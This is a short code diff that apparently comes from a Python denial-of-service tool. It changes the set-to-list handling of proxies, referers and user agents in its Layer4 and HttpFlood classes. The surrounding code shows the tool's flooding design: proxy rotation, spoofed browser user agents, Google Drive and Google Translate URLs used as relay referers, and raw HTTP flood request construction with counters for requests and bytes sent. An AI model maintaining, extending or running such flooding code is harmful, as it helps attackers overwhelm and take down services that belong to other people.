@@ -28,8 +28,9 @@ from .ImpactPacket import IP, TCP, UDP, Data
 from .core import cl, logger, ROOT_DIR
 
 from .referers import REFERERS
-REFERERS = set(a.strip() for a in REFERERS)
+REFERERS = list(set(a.strip() for a in REFERERS))
 from .useragents import USERAGENTS
+USERAGENTS = list(USERAGENTS)
 from .rotate import suffix as rotate_suffix, params as rotate_params
 
 
@@ -285,7 +286,7 @@ class Layer4:
                  ref: List[str],
                  method: str,
                  event: Event,
-                 proxies: Set[Proxy],
+                 proxies: List[Proxy],
                  REQUESTS_SENT,
                  BYTES_SEND,
                  ):
@@ -298,7 +299,7 @@ class Layer4:
         self.REQUESTS_SENT = REQUESTS_SENT
         self.BYTES_SEND = BYTES_SEND
         if proxies:
-            self._proxies = list(proxies)
+            self._proxies = proxies
         self.select(self._method)
 
     def run(self) -> Optional[int]:
@@ -533,9 +534,9 @@ class HttpFlood:
                  method: str,
                  rpc: int,
                  event: Event,
-                 useragents: Set[str],
-                 referers: Set[str],
-                 proxies: Set[Proxy],
+                 useragents: List[str],
+                 referers: List[str],
+                 proxies: List[Proxy],
                  REQUESTS_SENT,
                  BYTES_SEND) -> None:
         self.SENT_FLOOD = None
@@ -560,9 +561,9 @@ class HttpFlood:
                 ",https://drive.google.com/viewerng/viewer?url=",
                 ",https://www.google.com/translate?u="
             ]
-        self._referers = list(referers)
+        self._referers = referers
         if proxies:
-            self._proxies = list(proxies)
+            self._proxies = proxies
 
         if not useragents:
             useragents: List[str] = [
@@ -574,7 +575,7 @@ class HttpFlood:
                 'Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
             ]
-        self._useragents = list(useragents)
+        self._useragents = useragents
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                       target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
